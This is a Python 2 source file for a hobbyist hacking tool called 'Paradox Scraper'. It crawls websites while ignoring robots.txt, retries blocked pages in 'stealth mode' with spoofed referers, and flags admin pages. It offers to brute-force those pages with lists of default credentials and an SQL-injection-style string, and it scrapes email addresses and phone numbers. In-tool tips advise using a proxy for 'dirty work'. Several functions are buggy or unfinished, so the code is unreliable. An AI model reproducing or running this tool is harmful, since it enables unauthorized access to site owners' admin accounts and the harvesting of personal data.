#URL Spider based off of Christopher Reeves Web Scraper
#Created By Windows65 at Paradox Technologies
import urllib
import os
import sys
import re
import bs4 as bs
import urlparse
import mechanize
import Cookie
import cookielib
import subprocess
import urllib2
import unicodedata
import time
import random


from datetime import datetime, timedelta
from collections import Counter

global spiderTimes

def deleteLogs():
    print "not created yet."

def checkFirewall(url):
    bro = mechanize.Browser()
    cjj = cookielib.LWPCookieJar()
    bro.set_cookiejar(cjj)
    cc = cookielib.Cookie(version=0, name='sid', value="51cc1030963d4142742013af526443f1", expires=365, port=None, port_specified=False, domain=url, domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=True, discard=False, comment=None, comment_url=None, rest={'HttpOnly': False}, rfc2109=False)
    cjj.set_cookie(cc)
    bro.set_handle_equiv(True)
    bro.set_handle_redirect(True)
    bro.set_handle_referer(True)
    bro.set_handle_robots(False)
    bro.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
    bro.set_debug_http(True)
    bro.set_debug_redirects(True)
    bro.set_debug_responses(True)
    bro.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    print "[Info] | Received Header For " + str(url) + " | >>>\n" + "-"*80
    bro.open(url, timeout=10.0)
    print "-"*80
    try:
        print "\n"*3
        urll = raw_input("Enter Another Site To Check: (Press CTRL + C To Go To The Main )\n> ")
        checkFirewall(urll)
    except KeyboardInterrupt:
        scraperChoose()


def getUrlName(url):
    if url.startswith("https"):
        url = url[8:]
        url = url.split("/", 1)[0]
        print url

    elif url.startswith("http"):
        url = url[7:]
        url = url.split("/", 1)[0]
    return url

def cycle(links, extrasToPrint):
    linkz = []
    allVisited = []
    linkz.append(links)
    allVisited.append(links)
    thridPartyLinks = []
    url = getUrlName(links)
    count = 0

    while len(linkz) > 0:
        count = count + 1
        bro = mechanize.Browser()
        cjj = cookielib.LWPCookieJar()
        bro.set_cookiejar(cjj)
        cc = cookielib.Cookie(version=0, name='sid', value="51cc1030963d4142742013af526443f1", expires=365, port=None, port_specified=False, domain=linkz[0], domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=True, discard=False, comment=None, comment_url=None, rest={'HttpOnly': False}, rfc2109=False)
        cjj.set_cookie(cc)
        bro.set_handle_equiv(True)
        bro.set_handle_redirect(True)
        bro.set_handle_referer(True)
        bro.set_handle_robots(False)
        bro.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
        #bro.set_debug_http(True)
        #bro.set_debug_redirects(True)
        #bro.set_debug_responses(True)
        bro.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        bro.open(linkz[0], timeout=5.0)
        for lnk in bro.links():
            count = count + 1
            finalLink = urlparse.urljoin(lnk.base_url,lnk.url)
            urlparse.addheaders = [('User-agent', 'Mozilla/5.0')]
            if url in finalLink:
                if finalLink not in allVisited:
                    if count < 0:
                        count = 0
                    print "    "*count + "-" + str(finalLink) + str(extrasToPrint)
                    linkz.pop(0)
                    linkz.append(finalLink)
                    allVisited.append(finalLink)
                else:
                    pass
            else:
                #print "    "*count +  "[Third Party Link] | > " + finalLink
                thridPartyLinks.append(finalLink)
            count = count - 1
def loginToPage():
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)

    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
    br.set_debug_http(True)
    br.set_debug_redirects(True)
    br.set_debug_responses(True)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    url = adminpage
    url = parseUrl(url)
    userfourm = ["usr", "username", "userid", "Login ID", "user", "sadminID", "adminforum", "administrator", "userID", "adminid", "Admin", "user_name", "login", "adminID", "myusername", "userf", "login_user", "StaffID"]
    passfourm = ["pwd","adminp", "password", "passwd", "Login Password", "passforum", "pass", "adminpass", "Password", "passwordforum", "pswd", "mypassword" "un", "login_password"]
    if typez == "userf":
        br = mechanize.Browser()
        br.set_handle_robots(False)   # ignore robots
        br.set_handle_refresh(False)  # can sometimes hang without this
        br.addheaders = [('User-agent', 'Firefox')]

        for ctrl in userfourm:
            try:
                br.addheaders = [('User-agent', 'Firefox')]
                br.open(adminpage)
                br.select_form(nr = 0)
                br.form[ctrl] = "ping"
                #br.form["password"] = "ping"
                response1 = br.submit()
                response = response1.read()
            except:
                pass

global depth
depth = 1
def depthIndent(depth):
    depthLevel = ""
    if depth == 1:
        depthLevel = depthLevel + ">"
        return str(depthLevel)
    #For more add elif
    else:
        for i in range(0,depth):
            depthLevel = depthLevel + "    "
    return str(depthLevel) + "-"


def parseUrl(url):
    url = url.strip(" ")
    def slashCheck(ur):
        if ur.endswith('/'):
            return ur
        else:
            ur = ur + "/"
            return ur

    def wwwCheck(url):
        if "www." in url:
            return url
        else:
            if "http" in url:
                return url
            else:
                url = "www." + url
                return url

    def httpCheck(url):
        if "http" in url:
            return url
        else:
            url = "http://" + url
            return url
    url = wwwCheck(url)
    url = httpCheck(url)
    url = slashCheck(url)
    return url

def p():
    raw_input("-"*80 + "\nPress Any Key To Continue:\n> ")
def cls():
    print "\n"*50
    subprocess.call("cls", shell=True)
def color(clr):
    if clr == "r":
        subprocess.call("color 0c", shell=True)
    elif clr == "g":
        subprocess.call("color 0a", shell=True)
    elif clr == "b":
        subprocess.call("color 09", shell=True)
    else:
        pass

def curTime(seconds):
    sec = timedelta(seconds=(int(seconds)))
    d = datetime(1,1,1) + sec

    return ("Days: %d | Hours: %d | Minutes: %d | Seconds: %d" % (d.day-1, d.hour, d.minute, d.second))

def displayTip():
    tips = ["Press \"CTRL + C\" at Any time to pause a running script!",
            "Remember, Brute Forcing takes a long time, be patient!",
            "Always use this tool Responsibly! I am not responsible for anything you do!",
            "Live life to the fullest, meaning don't do anything to ruin it!",
            "Hack Responsibly!",
            "Press \"CTRL + C\" at Any time to pause a running script!",
            "Don't be a Script Kiddie ;)",
            "Remember, report all major errors to east837@gmail.com! (Should be a Report Error tool in client!)",
            "It takes dedication to learn and dedication to do.",
            "Press \"CTRL + C\" at Any time to pause a running script!",
            "The URL Spider has much more functionality than just scraping URL's, check it out!",
            "The scraper takes a longer because it has to parse the whole web page!",
            "If you are doing dirty work, make sure to use a proxy (At Least...)",
            "The creator of this is Windows65 from Paradox Technologies!",
            "Want to learn Python? dedicate at least 2 hours a day for the next 6 months and you will know it in no time!",
            "Do not listen to who says you can not learn to hack, they are jealous that you actually try!",
            "Remember, report all major errors to east837@gmail.com! (Should be a Report Error tool in client!)", ]
    return random.choice(tips)
def cap(string, length):
    return string if len(string)<=length else string[0:length-3]+'...'

def urlScraper(url, scrape, savePgs, scrapeNews):
    if "y" in scrapeNews:
        a = raw_input("\nUse the Default source? (y/n) No = Manual Source\n> ")
        if "y" in a:
            url = "www.nytimes.com"
        else:
            url = raw_input("Custom Source Chosen {Insert URL}:\n> ")
        scrape = "n"
        savePgs = "n"
        cls()
        print "[Info] | News Keyword Search Started. | Please be patient, I am scanning a large source. Thank you."
    newsURLs = []
    fileDetections = []
    detectFiles = True
    detectAdmin = False
    global depth1
    count = 0
    url = parseUrl(url)
    siteName = url
    extrasToPrint = ""
    if savePgs == "y":
        extrasToPrint = extrasToPrint + "  {Saved}"
        nameofFile = getUrlName(url) + ".html"
    if scrape == "y":
        extrasToPrint = extrasToPrint + "  {Scraping}"
    num = 0
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    c = cookielib.Cookie(version=0, name='sid', value="51cc1030963d4142742013af526443f2", expires=1, port=8080, port_specified=True, domain=url, domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=True, discard=False, comment=None, comment_url=None, rest={'HttpOnly': False}, rfc2109=False)
    cj.set_cookie(c)
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
    #br.set_debug_http(True)
    #br.set_debug_redirects(True)
    #br.set_debug_responses(True)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    f = open("links.txt", "r+")
    adminf = open("adminlinks.txt", "r+")
    f.write("""\n/------------------------------------------------------------------\\
|                 New Scraping Session:                            |
\\------------------------------------------------------------------/""")
    adminf.write("\n")
    emailf = open("scrapedEmails.txt", "r+")
    urls = [url]
    visited = [url]
    retry = 0
    adminDetections = ["admin.asp","admin.php","root.","adminlogin.","rootlogin.","administrator.","administratorlogin.","stafflogin."]
    extra = [""]
    times = 0
    while len(urls)>0: #While there are still links in the list
        count = count + 1
        try:
            #Helps with invalid URL's (Tries different method and passes if not working)
            try:
                #br.set_proxy("173.201.95.24:80","http")
                if "y" in scrapeNews:
                    newsURLs.append(urls[0])
                    #print ">" + urls[0]
                    times = times + 1
                    print str(times)
                else:
                    print ">" + urls[0]
                br.open(urls[0], timeout=5.0)
                br._factory.is_html = True
                #print "|" + "-"*25 + "Scraping Page: {" + urls[0] + "} " + "-"*25 + "|"
                urls.pop(0)

            except Exception, e:
                e = str(e)
                if "request disallowed by robots.txt" in e:
                    print "#"*50
                    print "[robots.txt_Error] | robots.txt Has disallowed this connection, I will try in stealth mode."
                    time.sleep(2)
                    print "Retrying: " + urls[0] + " in stealth mode level 1..."
                    try:
                        header = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20100101 Firefox/14.0.1', 'Referer': 'http://nsa.gov'}
                        request = urllib2.Request((urls[0] + "l0olz2iby0pass44ingy8ou/.../"), None, header)
                        br.open(request)
                    except Exception, e:
                        if "request disallowed by robots.txt" in str(e):
                            print "[robots.txt] | Bypass Method 1 was Unable to bypass."
                            try:
                                print "Retrying: " + urls[0] + " in stealth mode level 2..."
                                br.set_handle_robots(False)
                                header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36', 'Referer': 'https://www.google.com/'}
                                request = urllib2.Request((urls[0] + "l0olz2iby0pass44ingy8ou/.../"), None, header)
                                br.open(request)
                            except Exception:
                                print "[robots.txt_Error] | Bypass Method 2 was Unable to bypass.\n" + "#"*50

                    br._factory.is_html = True
                    urls.pop(0)
                elif "getaddrinfo failed" in e:
                    if count > 1:
                        print "[Error] | Unable to reach the given URL!!"
                        urls.pop(0)
                    else:
                        print "[Error] | Check your URL and try again!"
                        raw_input("> ")
                        scraperChoose()
                elif "403" in e:
                    print "[Error] | Access is currently denied."
                    urls.pop(0)
                elif "Not Found" in str(e):
                    urls.pop(0)
                    print "[Error 404] URL was not found, probably throwing us off, lets skip this one and keep going..."
                elif "redirect error that would lead to an infinite loop" in str(e):
                    print "The server is trying to send us into an infinite loop, lets bypass this ;)"
                elif "Unauthorized" in str(e):
                    print "[Error] | You are not authorized to view this page: " + urls[0]
                    urls.pop(0)
                elif "unknown status keyword" in str(e):
                    print "[Error] | Unknown Status Keyword | Skipping this url..."
                    urls.pop(0)
                else:
                    print "[Error: | Unhandled Exception | >" + e
                    saveNum = 0
                    urls.pop(0)
            try:
                for link in br.links():
                    count = count + 1
                    urlparse.addheaders = [('User-agent', 'Mozilla/5.0')]
                    newurl = urlparse.urljoin(link.base_url,link.url)


                    if newurl not in visited and url in newurl:
                        num = num+1
                        visited.append(newurl)
                        urls.append(newurl)
                        #cycle(newurl, extrasToPrint)
                        if "y" in scrapeNews:
                            newsURLs.append(newurl)
                        else:
                            print "    -" + newurl + extrasToPrint

                        for adminDetection in adminDetections:
                            if adminDetection in newurl.lower():
                                print "--"*45 + "{ALERT} | Possible Admin Page Found: \n" + newurl
                                print "\nWould You Like To Attempt To Brute Force It? (y/n)"
                                if detectAdmin == True:
                                    adminf.write(newurl + "\n")
                                    ans = raw_input("> ")
                                else:
                                    adminf.write(newurl + "\n")
                                if ans.strip() == "y":
                                    try:
                                        print "Looking For Username Input Field: "
                                        userfield = testForums(newurl, "userf")
                                        print "Looking For Password Input Field: "
                                        passfield = testForums(newurl, "passf")
                                        attemptLogin(newurl, userfield, passfield)
                                        print "Continuing Script: \n"
                                        print "--"*45
                                    except Exception,e:
                                        print "[Error] | " + str(e)
                                        pause()
                                    except KeyboardInterrupt:
                                        print "[Notice] |  Continuing..."
                                        pass
                                else:
                                    pass

                        if "y" in scrapeNews:
                            newsURLs.append(newurl)
                            
                        if savePgs.lower() == "y":

                            page = urllib2.urlopen(newurl)

                            page_content = page.read()
                            slocation =  os.path.dirname(os.path.abspath(__file__)) + "\\Pages\\"
                            filename = newurl.strip(".")

                            finalstring = os.path.join(slocation + nameofFile + (str(saveNum)) + "-" + ".html")
                            with open(finalstring, "r+") as fid:
                                saveNum = saveNum + 1
                                fid.write(slocation + page_content)

                        if scrape.lower() == "y":
                            saveResults = False
                            scrapeURL(newurl, saveResults, "t", "t", True)
                            #cls()
                            pass

                        if ".pdf" in newurl:
                            page = urllib2.urlopen(newurl)
                            pdfContent = page.read()
                            slocation =  os.path.dirname(os.path.abspath(__file__)) + "\\savedPDFs\\"
                            finalstring = os.path.join(slocation + "savedPDF" + saveNum + ".pdf")
                            f = open(finalstrings, "r+")
                            f.write(pdfContent)
                            f.close()
                            saveNum = saveNum + 1

                        if "mailto:" in newurl:
                            print "[Mail Address Found] | > " + newurl
                        if detectFiles == True:
                            extDetections = [".txt", ".log", ".xml", ".pdf",
                                             ".cgi", ".reg", ".conf",
                                             ".ini", ".mdb", ".exe", ".inc",
                                             ".wsdl", ".cnf", ".dat", ".pl", ".bak",
                                             ".js", ".py", ".jsp", ".sh", ".dll",
                                             ".cfm", ".bat", ".pwd", ".sql", ".rb",
                                             ".gz", ".bak", ".ssh", ".docs", ".pac",
                                             ".bak", ".sys", ".nsf", ".vsd", ".login",
                                             ".jnlp"]
                            for exts in extDetections:
                                if exts in newurl:
                                    fileDetections.append(newurl)
                                pass
    
            except Exception,e:
                e = str(e)
                if "IncompleteRead" in e:
                    print "[Error] | Incomplete Read | Skipping this url..."
                    pass
                elif "adsfghmgf" in e:
                    print "how dis happen? -.-"
                else:
                    print "[Error] | Unhandled Exception LN 281 | " + e
                    pass


        except Exception,e:
            try:
                urls.pop(0)
            except:
                print "List is empty: >" + str(e)
            if "not vi" in str(e):
                print "Error: " + str(e)
            elif "forcibly closed" in str(e):
                print "We have been caught, cooling down for 20 seconds (Press CTRL + C To continue on your time.)"
                try:
                    time.sleep(20)
                except:
                    pass
            elif "expected name token" in str(e):
                print "(Ignore) | Name token not provided!"
            elif "char in declaration" in str(e):
                print "(Ignore) | Unexpected Error in Declaration!"
            elif "Not Found" in str(e):
                urls.pop(0)
                print "[Error 404] URL was not found, probably throwing us off, lets skip this one and keep going..."
            elif "unknown status keyword" in str(e):
                print "[Error] | Unknown Status Keyword | Skipping this url..."
                urls.pop(0)
            elif "timed out" in str(e):
                print "[Error] | The page has timed out. | Lets skip this one and move on shall we!"
                urls.pop(0)
            else:
                emailf.close()
                adminf.close()
                exc_type, exc_obj, exc_tb = sys.exc_info()
                print str(e) + "    ON LINE NUMBER: " + (str(exc_tb.tb_lineno)) + "}"
                raw_input("Press Any Key To Proceed: ")
                cls()
                scraperChoose()
        except KeyboardInterrupt:
            print """
----------------------------------------------
Script Paused
--------------------------------------
Main Scrape Menu------(1)
Continue Script-------(Any Other Key)
--------------------------------------
"""
            pauseChs = raw_input("> ")
            if pauseChs == "1":
                emailf.close()
                adminf.close()
                scraperChoose()
            else:
                pass
        except:
            print "[Unhandled Exception:] | Retrying..."
            retry = retry +1
            if retry > 3:
                urls.pop(0)
            else:
                pass
            pass


    
    if "y" in scrapeNews:
        newsURLs[0:len(newsURLs)] = [''.join(newsURLs[0:len(newsURLs)])]
        low_words = [fixWord(word, siteName) for word in newsURLs]
        word_counts = []
        
        for phrase in low_words:
            phrase = phrase.split()
            for word in phrase:
                word_counts.append(word)
        word_counts = Counter(word_counts)

        
        print """\n\n> Final News Crawler Report:
>----------------------------------------------------------------------------------------------------------------------<
The Following Words Are From Lease to Greatest in Frequency:
>---------------------------------------------------<

[Rank] | [Word]
>---------------------------<"""
        i = 1
        for word in word_counts:
            print "[{0}]   |   {1}".format(i, word.title())
            i = i+1
        raw_input(">---------------------------<"+"\n> ")
        
        
    else:
        print """\n\n> Final Web Crawler Report:
>----------------------------------------------------------------------------------------------------------------------<"""
        print "\nDetected Files: \n" + "--"*45
        legnth = []
        for f in fileDetections:
            print f
            legnth.append(f)
        if len(legnth) == 0:
            print "[Info] | No files were detected!"
        print "--"*45
        print "\n[Site]: | " + url + " | Has {" + str(count) + "} Pages On It."
        print """>----------------------------------------------------------------------------------------------------------------------<"""
        raw_input("> ")

def finishURLName(url):
    byeChars = ["www.", "\\", "//",".com",".net",".org",".gov",".info",".de",".co",".edu",".mil",".arpa",".int"]
    for goaway in byeChars:
        url = url.replace(goaway," ")
    return url.strip()
    

def fixWord(word, url):
    url = finishURLName(getUrlName(url))
    byechars = ["<>/\\|][{}=+-_)(*&^\%$#@!?,.:;\"\'", "www", "https", "http", "net", "com", "org", url]
    for goaway in list(byechars[0]):
        word = word.replace(goaway," ")
    for byeWords in byechars:
        word = word.replace(byeWords, " ")
    return " ".join(word.split()).lower()
    

    
def testForums(adminpage, typez):
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)

        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
        #br.set_debug_http(True)
        #br.set_debug_redirects(True)
        #br.set_debug_responses(True)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        url = adminpage
        url = parseUrl(url)
        userfourm = ["usr", "username", "userid", "Login ID", "user", "sadminID", "adminforum", "administrator", "userID", "adminid", "Admin", "user_name", "login", "adminID", "myusername", "userf", "login_user", "StaffID", "UserName"]
        passfourm = ["pwd","adminp", "password", "passwd", "Login Password", "passforum", "pass", "adminpass", "Password", "passwordforum", "pswd", "mypassword" "un", "login_password", "PassWord"]
        if typez == "userf":
            br = mechanize.Browser()
            br.set_handle_robots(False)
            br.set_handle_refresh(False)
            br.addheaders = [('User-agent', 'Firefox')]

            for ctrl in userfourm:
                try:
                    br.addheaders = [('User-agent', 'Firefox')]
                    br.open(adminpage)
                    br.select_form(nr = 0)
                    br.form[ctrl] = "ping"
                    #br.form["password"] = "ping"
                    response1 = br.submit()
                    response = response1.read()
                    byechars = "<>/\\|][{}=+-_)(*&^\%$#@!?,.:;\"\'"
                    for goaway in list(byechars):
                        response = response.replace(goaway," ")
                    print "User Forum Found: " + ctrl
                    return ctrl
                except Exception,e:
                    if "no control matching" in str(e):
                        pass
                    else:
                        print str(e)
                        print "No User Forum Found, Trying Without Userforum In Case Of Pass-Only Login."
                        break
                except KeyboardInterrupt:
                    print """
----------------------------------------------
Script Paused
--------------------------------------
Main Scrape Menu------(1)
Continue Script-------(Any Key)
--------------------------------------
"""
                    pauseChs = raw_input("> ")
                    if pauseChs == "1":
                        scraperChoose()
                    else:
                        pass

        if typez == "passf":
            br = mechanize.Browser()
            cj = cookielib.LWPCookieJar()
            br.set_cookiejar(cj)
            br.set_handle_equiv(True)

            br.set_handle_redirect(True)
            br.set_handle_referer(True)
            br.set_handle_robots(False)
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
            #br.set_debug_http(True)
            #br.set_debug_redirects(True)
            #br.set_debug_responses(True)
            br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
            br.addheaders = [('User-agent', 'Firefox')]

            for ctrl in passfourm:
                try:
                    br.addheaders = [('User-agent', 'Firefox')]
                    br.open(adminpage)
                    br.select_form(nr = 0)
                    #br.form[ctrl] = "ping"
                    br.form[ctrl] = "ping"
                    response1 = br.submit()
                    response = response1.read()
                    byechars = "<>/\\|][{}=+-_)(*&^\%$#@!?,.:;\"\'"
                    for goaway in list(byechars):
                        response = response.replace(goaway," ")
                    print "Password Forum Found: " + ctrl
                    return ctrl
                except Exception,e:
                    if "no control matching" in str(e):
                        pass

def attemptLogin(url, uf, pf):
    url = parseUrl(url)
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)

    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
    #br.set_debug_http(True)
    #br.set_debug_redirects(True)
    #br.set_debug_responses(True)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    warnUser = 0
    username = ["admin", "Admin", "Administrator", "administrator", "root", "root", "netman", "changeme", "default", "login", "write", "read", "debug", "tech", "adm", "security", "manager", "username", "user", "login", "webadministrator", "webadmin", "root123", "webs", "java", "token", "owner", "guest", "ghost", "test", "23 OR 1=1"]
    password = ["admin", "password", "pass", "Password", "Pass", "Admin", "root", "Root", "12345", "123456", "changeme", "qwerty", "login", "!root", "0000", "security", "3com", "none", "PASSWORD", "synnet", "permit", "abc", "abc123", "friend", "blank", "attack", "superuser", "no default password", "no password", "password not found", "invalid password", "system", "letmein", "23 OR 1=1"]
    #userf = testForums(url, "userf")
    #passf = testForums(url, "passf")

    successTestFile = open('loginSucessTest.txt')

    for user in username:
        try:
            for passw in password:
                br.open(url)
                br.select_form(nr = 0)
                try:
                    br.form[uf] = user
                except:
                    if warnUser == 0:
                        print "Userforum Not Found, Will Try To Login Without It!"
                        warnUser = 1
                    else:
                        pass
                br.form[pf] = passw
                print "Trying: " + user + " | " + passw
                response1 = br.submit()
                response = response1.read()
                byechars = "<>/\\|][{}=+-_)(*&^\%$#@!?,.:;\"\'"
                for goaway in list(byechars):
                    response = response.replace(goaway," ")
                #print response
                for word in response.split():
                    if word.strip() in successTestFile.readlines():
                        print "Password and user found: " + user + "  | " + passw
                    else:
                        pass
        except KeyboardInterrupt:
            print """
----------------------------------------------
Script Paused
--------------------------------------
Main Scrape Menu------(1)
Continue Script-------(Any Key)
--------------------------------------
"""
            pauseChs = raw_input("> ")
            if pauseChs == "1":
                scraperChoose()
            else:
                pass

        except Exception,e:
            print "Error: "
            print str(e)
            print "Resolve This Issue Then Continue:"
            raw_input("> ")
            pass

def scrapeURL(url, saveResults, findURL, findEmail, bot):
    checkPhn = True
    html = urllib.urlopen(url).read()
    soup = bs.BeautifulSoup(html)
    texts = soup.findAll(text=True)
    import time
    start = time.time()
    slocation =  os.path.dirname(os.path.abspath(__file__)) + "\\Pages\\"
    finalstring = os.path.join(slocation, "URLScrape_" + ".txt")
    fid = open(finalstring, "r+")

    def visible(element):

        #AdvancedSettings = raw_input("Advanced Settings? (y/n)> ")
        newElement = unicodedata.normalize('NFKD', element).encode('utf8')
        mailf = open("scrapedEmails.txt", "r+")
        byechars = "<>(){}[]|,\%-=+!@#^&*;:\'\"\\/"
        delStrings = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ]
        finalTxt = [""]
        new = newElement
        lastTest = byechars[-1:]
        newElemenet = newElement.split('\n')
        linkDetect = ["www.","http:","https:",".com",".net",".org",".edu"]
        detectionAmount = 0
        detectionSensitivity = 2 #The higher the number the more factors there are in finding a link, do not go over the size of linkDetect
        mailDetect = ["@gmail","@hotmail","@yahoo","@msn","@icloud","@vtext"] #Deals with .com in detection loop
        counterz = 0
        try:
            for goaway in list(byechars):

                if "http" in new:
                    if goaway == "/" or goaway == ":":
                        pass
                    else:
                        new = new.replace(goaway, '')
                        counterz = counterz + 1
                else:
                    new = new.replace(goaway, '')
                    counterz = counterz + 1
                new = new.strip()
                new = re.sub(r'\s+', ' ', new)
                if len(new) > 1500:
                   print "Too Long To Print! (Will still be in log file!)"
                   finalTxt.append(new) # Print This!!!!!!!!!!!!
                else:
                    pass

                #Small algorithm to detect a url in HTML/site Text and output it
                if findURL == True:
                    if goaway == lastTest:
                        for test in linkDetect:
                            if test in new:
                                detectionAmount = detectionAmount + 1
                                if detectionAmount == detectionSensitivity:
                                    for checkMe in new.split(" "):
                                        checkMe = checkMe.strip()
                                        for thingToCheck in linkDetect:
                                            #print "Current URL Scan: " + thingToCheck + "\n"
                                            if thingToCheck in checkMe:
                                                if checkMe.startswith('http') or checkMe.startswith('www.') and "." in checkMe:
                                                    print "{Found URL:} | " + checkMe
                                                    finalTxt.append(checkMe)
                                                    break
                                            else:
                                                pass

                #Small algorithm to check for Emails in text
                if findEmail == True:
                    for detctDMail in mailDetect:
                        for checkThing in new.split():
                            if detctDMail in checkThing:
                                print "{Possible Email Found:} " + detctDMail.strip()
                                mailf.write(detctDMail.strip() + "\n")
                                finalTxt.append(detctDMail.strip())
                            else:
                                pass

                if checkPhn == True:
                    try:
                        for thing in new.split():
                            thing = re.findall('\d+', thing)
                            if len(int(thing)) == 10 or len(int(thing)) == 11:
                                print "{Phone #} | " + new
                                print str(thing)
                                raw_input("> num /\\")
                            else:
                                pass
                    except:
                        pass




            if saveResults == True:
                try:
                    text = new
                    slocation =  os.path.dirname(os.path.abspath(__file__)) + "\\Pages\\URLScraper"
                    time = (str(datetime.datetime.now().time()))
                    time = time.replace(":","-")

                    finalstring = os.path.join(slocation, "URLScrape_" + ".txt")
                    fid.write(finalTxt)
                except:
                    pass
            #Print final version of text!
            if new.strip() == "":
                pass
            else:
                print new

        except Exception,e:
            fid.close()
            mailf.close()
            print "Error: " + str(e)
            raw_input("> ")
        except KeyboardInterrupt:
            print """
----------------------------------------------
Script Paused
--------------------------------------
Main Scrape Menu------(1)
Continue Script-------(Any Key)
--------------------------------------
"""
            pauseChs = raw_input("> ")
            if pauseChs == "1":
                fid.close()
                mailf.close()
                scraperChoose()
            else:
                pass

    try:
        visible_texts = filter(visible, texts)
        print visible_texts
        import time
        finish = time.time()
        start = abs(start)
        finish = abs(finish)
        tt = (int(start)) - (int(finish))
        tt = abs(tt)
        timeTaken = curTime(tt)
        if bot == False:
            print "Completed In: " + timeTaken
            raw_input("> ")
        else:
            print "[Info]: | Scraped + " + url + " | In {" + timeTaken + "}..."
            pass
    except Exception,e:
        print "Error: " + str(e)
        raw_input("> ")
    except KeyboardInterrupt:
        print """
----------------------------------------------
Script Paused
--------------------------------------
Main Scrape Menu------(1)
Continue Script-------(Any Key)
--------------------------------------
"""
        pauseChs = raw_input("> ")
        if pauseChs == "1":
            fid.close()
            scraperChoose()
        else:
            pass




def findVulnFiles(url):
    testLinks = []
    fileNames = ["robots.txt","sitemap.txt","","","",
                 "","","","","",
                 "","","","","",
                 "","","","","",]
    for fl in fileNames:
        pass




def scraperChoose():
    #color("b")

    color("a")
    print "Helpful Tip: " + displayTip() + "\n"
    print """Paradox Scraper:
/-------------------------------------\\
|URL Spider>---------------(1)        |
|Webpage Scraper>----------(2)        |
|Delete Logs>--------------(3)        |
|Attempt Admin Login>------(4)        |
|Scrape Links From Page>---(5)        |
|Firewall Detection>-------(6)        |
|Vulnerable Files>---------(7)        |
\\-------------------------------------/
"""
    scrapetype = raw_input("> ")
    if scrapetype.strip() == "1":
        cls()
        url = raw_input("Insert your URL or say \"News\" to scrape the latest news: \n> ")
        url = parseUrl(url)
        cls()
        if "news" in url.lower():
            scrapeNews = "y"
            cls()
            aO = "n"
        else:
            scrapeNews = "n"
            aO = raw_input("Advanced Options?\n> (y/n)")
            
        if "y" in aO.lower():
            scrape = raw_input("Scrape Each Page: (y/n)?\n> ")
            cls()
            savePgs = raw_input("Save Each Page Found? (y/n)\n> ")
            cls()
        else:
            scrape = "n"
            cls()
            savePgs = "n"
            cls()
        newUrlz = []
        numj = 0
        start = time.time()
        urlScraper(url, scrape, savePgs, scrapeNews)
        finish = time.time()
        start = abs(start)
        finish = abs(finish)
        tt = int(start) - int(finish)
        tt = abs(tt)
        timeTaken = curTime(tt)
        print ">" + "--"*50 + "<\n>Completed Web Scrape In: " + timeTaken
        raw_input("> ")
        cls()
        scraperChoose()
    if scrapetype.strip() == "2":
        cls()
        url = raw_input("URL > ")
        url = parseUrl(url)
        try:
            findURL = raw_input("Scrape URL's out of text? (y/n)")
            if findURL == "y":
                findURL = True
            else:
                findURL = False
            findEmail = raw_input("Scrape Emails out of text? (y/n)")
            if findEmail == "y":
                findEmail = True
            else:
                findEmail = False
        except KeyboardInterrupt:
            scraperChoose()
        scrapeURL(url, "t", findURL, findEmail, False)
        raw_input("> ")
        cls()
        scraperChoose()
    if scrapetype.strip() == "3":
        cls()
        deleteLogs()
        cls()
        scraperChoose()
    if scrapetype.strip() == "4":
        cls()
        url = raw_input("Admin Login URL: ")
        userfield = testForums(url, "userf")
        passfield = testForums(url, "passf")
        attemptLogin(url, userfield, passfield)
        cls()
        scraperChoose()

    if scrapetype.strip() == "5":
        cls()
        url = raw_input("Link Scrape URL: \n> ")
        log = raw_input("Log Data? (t/f)\n> ").strip()
